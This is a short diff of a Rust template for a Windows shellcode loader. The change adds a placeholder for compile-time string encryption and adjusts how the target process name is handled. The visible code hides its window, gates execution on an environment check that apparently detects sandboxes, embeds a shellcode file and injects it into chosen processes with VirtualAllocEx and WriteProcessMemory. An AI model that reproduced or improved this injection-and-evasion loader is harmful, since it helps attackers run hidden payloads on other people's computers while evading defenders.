@@ -1,6 +1,8 @@
 #![windows_subsystem = "windows"]
 #![allow(non_snake_case)]
 
+{{LITCRYPT_SETUP}}
+
 use sysinfo::System;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Memory::VirtualAllocEx;
@@ -102,14 +104,14 @@ fn main() {
 
     if !check_environment() { return; }
 
-    let tar: &str = "{{TARGET_PROCESS}}";
+    let tar = {{TARGET_PROCESS}};
 
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     let mut vec: Vec<u8> = buf.to_vec();
 
     {{MAIN}}
 
-    let list: Vec<usize> = boxboxbox(tar);
+    let list: Vec<usize> = boxboxbox(&tar);
     if !list.is_empty() {
         for i in &list {
             enhance(vec.clone(), *i);
